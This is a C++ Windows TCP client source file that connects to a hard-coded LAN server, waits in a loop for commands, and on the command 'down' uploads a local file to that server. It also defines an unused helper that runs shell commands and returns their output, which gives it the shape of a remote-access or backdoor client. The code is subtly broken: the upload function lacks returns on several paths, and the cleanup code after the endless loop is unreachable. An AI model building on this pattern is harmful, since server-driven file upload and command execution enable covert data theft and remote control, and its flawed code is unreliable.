// Reminder to Save as tcp_client.cpp
#include <winsock2.h>
#include <ws2tcpip.h> // For InetPton and addrinfo
#include <iostream>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <stdlib.h>
#include <stdio.h>
#include <memory>
#include <stdexcept>
#include <array>
#include <fstream>
#include <vector>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib") // Link with Ws2_32.lib

std::string upload(SOCKET clientSocket) {
    std::ifstream inputFile("image.png", std::ios::binary);
    
    try {
        if (std::filesystem::exists("image.png")) {
            std::uintmax_t fileSize = std::filesystem::file_size("image.png");
            std::string fileSizeStr = std::to_string(fileSize);
            std::cout << "File size as string: " << fileSizeStr << " bytes" << std::endl;
            const char* char_fileSize = fileSizeStr.c_str();
            send(clientSocket, char_fileSize, strlen(char_fileSize), 0);
            std::cout << "File size sent!" << std::endl;
        }
        else {
            std::cerr << "File does not exist." << std::endl;
        }
    }
    catch (const std::filesystem::filesystem_error& ex) {
        std::cerr << "Filesystem error: " << ex.what() << std::endl;
    }
    char buffer[512];
    const char* ACK = "ACK";
    int ACK_message = recv(clientSocket, buffer, sizeof(buffer), 0) > 0;
    std::cout << ACK_message << std::endl;
    
    if (ACK_message == 1) {



        const size_t CHUNK_SIZE = 4096; // Example chunk size
        std::vector<char> file_buffer(CHUNK_SIZE);

        while (inputFile.read(file_buffer.data(), file_buffer.size())) {
            std::streamsize bytesRead = inputFile.gcount();
            //std::cout << "Read " << bytesRead << " bytes." << std::endl;
            if (send(clientSocket, file_buffer.data(), bytesRead, 0) > 0) {
                std::cout << "[*] " << bytesRead << "of data sent." << std::endl;

            }
            //calc_file_size += bytesRead;
            //std::cout << "Final File Size is: " << calc_file_size;
        }

        // Process any remaining data in the buffer from the last read
        std::streamsize remainingBytes = inputFile.gcount();
        if (remainingBytes > 0) {
            //std::cout << "Read " << remainingBytes << " remaining bytes." << std::endl;
            if (send(clientSocket, file_buffer.data(), remainingBytes, 0) > 0) {
                std::cout << "[*] " << remainingBytes << "of data sent." << std::endl;
                std::cout << "[+] File sent SUCCESFULLY!" << std::endl;
                const char* end_message = "[+] File uploading DONE!";
                inputFile.close();
                return end_message;
            }
            //calc_file_size += remainingBytes;
            //std::cout << "Final File Size is: " << calc_file_size;

        }
    }
    else {
        std::cout << "ACK failed with the other side!" << std::endl;
    }

    if (!inputFile.is_open()) {
        std::cerr << "Error opening file!" << std::endl;
    }

    
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;

    // Open pipe to file
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    // read till end of process
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
    result += buffer.data();
    }

    // Close pipe
    _pclose(pipe);
    return result;
}

int main() {
    // Step 1: Initialize Winsock
    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaResult != 0) {
        std::cerr << "WSAStartup failed: " << wsaResult << std::endl;
        return 1;
    }

    // Step 2: Create socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Step 3: Define server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080); // Choose your port

    // IP address: localhost (127.0.0.1) or another server
    inet_pton(AF_INET, "192.168.0.109", &serverAddr.sin_addr);

    // Step 4: Connect to server
    int connectResult = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (connectResult == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to server!" << std::endl;

    // Step 5: Send a message
    //const char* msg = "Hello, server!";
    //send(clientSocket, msg, strlen(msg), 0);
    

    char buffer[512];

    std::string desired_command_download = "down";

    // Step 6: Receive response
    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0'; // Null-terminate
            std::cout << "Server Command: " << buffer << std::endl;
            
            if (buffer == desired_command_download) {
                std::cout << "Upload function started!" << std::endl;
                upload(clientSocket);
                
            }
        }

            
            
    } 
    
    // Step 7: Cleanup
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
